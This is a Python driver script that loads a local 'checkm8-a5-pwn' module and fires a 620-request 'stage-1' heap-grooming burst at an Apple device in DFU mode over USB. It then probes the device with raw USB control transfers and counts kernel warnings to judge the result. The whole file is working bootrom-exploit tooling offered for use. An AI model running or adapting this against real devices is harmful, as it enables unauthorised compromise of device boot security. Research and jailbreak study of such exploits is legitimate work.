#!/usr/bin/env python3
"""Live feng-shui: fire the day-one 620 in-cancel burst against the
currently-LIVE ROM window, with full timing + aftermath evidence."""
import fcntl
import glob
import importlib.util
import os
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
spec = importlib.util.spec_from_file_location(
    "dayone", os.path.join(HERE, "checkm8-a5-pwn.py"))
dayone = importlib.util.module_from_spec(spec)
spec.loader.exec_module(dayone)


def warns():
    out = subprocess.run(["dmesg"], capture_output=True, text=True).stdout
    return out.count("no TDs queued")


def main():
    w0 = warns()
    usb = dayone.LibUSB()
    print("[live] libusb ready, firing stage-1 NOW")
    t0 = time.time()
    live = None
    try:
        live = dayone.stage1(usb, 3, 620, 'in-cancel', 1000, 500, False)
    except SystemExit as e:
        print("[live] stage1 SystemExit: %s" % e)
    except Exception as e:
        print("[live] stage1 error: %r" % e)
    dt = time.time() - t0
    print("[live] stage1 done in %.2fs live=%r (%.1fms/req)"
          % (dt, live, dt / 620 * 1000))

    # aftermath: serve health + timing
    import ctypes
    class Ctl(ctypes.Structure):
        _fields_ = [('r', ctypes.c_ubyte), ('b', ctypes.c_ubyte),
                    ('w', ctypes.c_ushort), ('i', ctypes.c_ushort),
                    ('l', ctypes.c_ushort), ('t', ctypes.c_uint),
                    ('d', ctypes.c_void_p)]
    for j in range(4):
        for p in glob.glob("/sys/bus/usb/devices/*/idProduct"):
            if open(p).read().strip() == "1227":
                n = os.path.dirname(p)
                bus = int(open(n + "/busnum").read())
                dev = int(open(n + "/devnum").read())
                fd = os.open("/dev/bus/usb/%03d/%03d" % (bus, dev), os.O_RDWR)
                buf = ctypes.create_string_buffer(255)
                ct = Ctl(0x80, 6, 0x0303, 0x0409, 255, 300,
                         ctypes.cast(buf, ctypes.c_void_p))
                t1 = time.time()
                try:
                    r = fcntl.ioctl(fd, 0xC0185500, ct)
                    print("[live] serve%d ret=%d %.1fms cpid=%s"
                          % (j, r, (time.time() - t1) * 1000,
                             "CPID" in buf.raw[:r].decode("utf-16le", "ignore")))
                except OSError as e:
                    print("[live] serve%d errno=%d %.1fms"
                          % (j, e.errno, (time.time() - t1) * 1000))
                os.close(fd)
                break
        time.sleep(0.3)
    w1 = warns()
    print("[live] warns: %d -> %d (+%d)" % (w0, w1, w1 - w0))
    return 0


if __name__ == "__main__":
    sys.exit(main())
